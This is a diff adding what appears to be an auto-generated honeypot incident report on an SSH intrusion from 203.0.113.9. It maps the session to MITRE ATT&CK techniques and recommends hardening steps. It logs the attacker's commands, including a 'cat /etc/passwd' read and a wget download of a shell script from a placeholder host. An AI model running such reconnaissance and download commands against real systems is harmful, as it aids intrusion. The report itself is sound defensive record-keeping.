@@ -1,0 +1,33 @@
+INCIDENT REPORT: 203.0.113.9
+Country: India  Severity: Critical (score 202)
+First seen: 2026-10-09T15:18:23.622494Z  Last seen: 2026-10-09T19:18:56.428800Z
+Blocked: no
+Total events: 21  Commands: 9
+
+MITRE ATT&CK techniques:
+  T1021.004  Remote Services: SSH  (x1)
+  T1033  System Owner/User Discovery  (x1)
+  T1053.003  Scheduled Task/Job: Cron  (x1)
+  T1057  Process Discovery  (x1)
+  T1059.004  Unix Shell  (x9)
+  T1078  Valid Accounts  (x1)
+  T1082  System Information Discovery  (x1)
+  T1083  File and Directory Discovery  (x1)
+  T1087.001  Account Discovery: Local Account  (x1)
+  T1105  Ingress Tool Transfer  (x4)
+
+Commands run:
+  $ whoami
+  $ uname -a
+  $ cat /etc/passwd
+  $ wget http://example.com/x.sh
+  $ curl http://example.com
+  $ crontab -l
+  $ ls
+  $ ps
+  $ exit
+
+Downloaded URLs: http://example.com/x.sh, http://example.com
+Sample passwords tried: none
+
+Recommendations: disable password SSH, use keys, rate-limit/fail2ban, egress filtering.
